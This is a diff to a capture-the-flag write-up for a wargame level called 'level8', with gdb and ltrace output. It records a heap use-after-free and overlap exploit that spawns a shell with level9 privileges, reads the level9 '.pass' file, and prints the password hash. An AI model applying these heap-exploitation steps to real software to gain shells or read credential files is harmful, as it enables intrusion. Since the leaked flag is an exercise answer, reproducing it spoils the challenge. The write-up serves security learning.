@@ -31,6 +31,35 @@ Non-debugging symbols:
 0x08048480  system@plt -> nice convination with /bin/sh
 0x08048564  main -> just this function
 #+end_src
+** search for globals vars
+#+begin_src shell
+gdb -batch ./$USER -ex "info variables"
+All defined variables:
+
+Non-debugging symbols:
+0x08048808  _fp_hw
+0x0804880c  _IO_stdin_used
+0x08048948  __FRAME_END__
+0x0804994c  __CTOR_LIST__
+0x0804994c  __init_array_end
+0x0804994c  __init_array_start
+0x08049950  __CTOR_END__
+0x08049954  __DTOR_LIST__
+0x08049958  __DTOR_END__
+0x0804995c  __JCR_END__
+0x0804995c  __JCR_LIST__
+0x08049960  _DYNAMIC
+0x08049a2c  _GLOBAL_OFFSET_TABLE_
+0x08049a60  __data_start
+0x08049a60  data_start
+0x08049a64  __dso_handle
+0x08049a80  stdin@@GLIBC_2.0
+0x08049aa0  stdout@@GLIBC_2.0
+0x08049aa4  completed.6159
+0x08049aa8  dtor_idx.6161
+0x08049aac  auth #Interesting
+0x08049ab0  service #
+#+end_src
 * Binary analysis
 #+begin_src shell
   (gdb) set disassembly-flavor intel
@@ -497,15 +526,16 @@ Non-debugging symbols:
           return eax;
   }
 #+end_src
-* Exploit
-# Ejecucion
-#+begin_src shell
-(nil), (nil) 
-hola <- loop read from stdin until EOF (Ctrl + D)
-(nil), (nil)
+[[source]]
 
+** Initial value globals
+#+begin_src shell
+x/wx &auth
+0x8049aac <auth>:	0x00000000
+(gdb) x/wx &service
+0x8049ab0 <service>:	0x00000000
 #+end_src
-# ejecucion con libcalls
+** Let's test with ltrace
 #+begin_src shell
  ltrace ./level8
 __libc_start_main(0x8048564, 1, 0xbffffd14, 0x8048740, 0x80487b0 <unfinished ...>
@@ -536,24 +566,81 @@ fwrite("Password:\n", 1, 10, 0xb7fd1a20Password:
 )              = 10
 
 #+end_src
-## How to Exploit
-# Reviewing the asm and the libcalls look like i need to create a heap string with auth and in the pos 32, 33, 34, 35 != 0
-auth malloc just 4 risk segfault and undefined behavior the bad part is that is the ref pointer to pointer arithmetics, Should create one.
-ideally then free and create a full string with service that will return the value of the not nulled auth global var
-service save in another place and can create more than 4 bytes each time.
-fresh run
+** Curiosity
+Cause the condition for memcmp is 6 you could use servic and work fine be careful cause for string add one char more for example a space.
+#+begin_src shell
+servic  AAAAAAAAAAAAAAAA
+#+end_src
+*** Bad practice
+#+begin_src shell
+  auth 
+  0x804a008, (nil) 
+  reset
+  0x804a008, (nil) 
+  reset
+  ,*** glibc detected *** /home/user/level8/level8: double free or corruption (fasttop): 0x0804a008 ***
+#+end_src
+** Attack point
+*** CANC First Strategy
+CLOSED: [2025-11-21 Fri 11:39]
+:LOGBOOK:
+- State "CANC"       from              [2025-11-21 Fri 11:39] \\
+  Don't reach the result
+:END:
+'auth ' malloc 4 and strcpy overflow danger.
+'auth' + 32 Byte offset for enter to system("/bin/sh").
+'auth' strcpy limit to 30B don't got the enough size to  reach the desire va. 
+*** Second Strategy
+1. "auth usr\n"  # with a valid user of 4 chars \n included.
+2. "service "+ "B" * service_len
+3. "login"
+   #+begin_src shell
+     len of service to enter in system
+     #    auth_va  , service_va
+          0x804a008, 0x804a018 
+     # auth_va + 0x20 = 0x804a028
+     # service_va + 0x10(16) = 0x804a028 
+     "service " + "B"*16
+   #+end_src
+**** Proof of Concept
+   #+begin_src shell
+     (nil), (nil) 
+     auth usr
+     0x804a008, (nil) 
+     service BBBBBBBBBBBBBBBB
+     0x804a008, 0x804a018 
+     login
+     $ id
+     uid=2008(level8) gid=2008(level8) groups=2008(level8),100(users)# i am in gdb
+   #+end_src
+*** Third Strategy
+1. "auth [3B]\n" # Optional use Three Bytes before newline
+2. "reset"#free the auth malloc but still with the va of the malloc free.
+3.  "service" + "B"*32  # strdup will use or not the va of previous malloc being free.
+4. "login"
+**** Proof of Concept
+#+begin_src shell
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
+reset
+0x804a008, (nil) 
+servic AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+0x804a008, 0x804a018 
+login
+$ id
+uid=2008(level8) gid=2008(level8) groups=2008(level8),100(users)
+$ exit
+0x804a008, 0x804a018 
+#+end_src
+* Exploit
 #+begin_src shell
 "auth bla\n"
 "reset"
 "serviceCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC" -> 36 'C'
 "login\n"
 #Explotation Completed just need stop execution with ltrace
-system("/bin/sh"$ id
-uid=2008(level8) gid=2008(level8) groups=2008(level8),100(users)
-#+end_src
-# With out ltrace
-#+begin_src shell
-$ id                             #interesting one
+$ id
 uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
 $ cat /home/user/level9/.pass
 c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
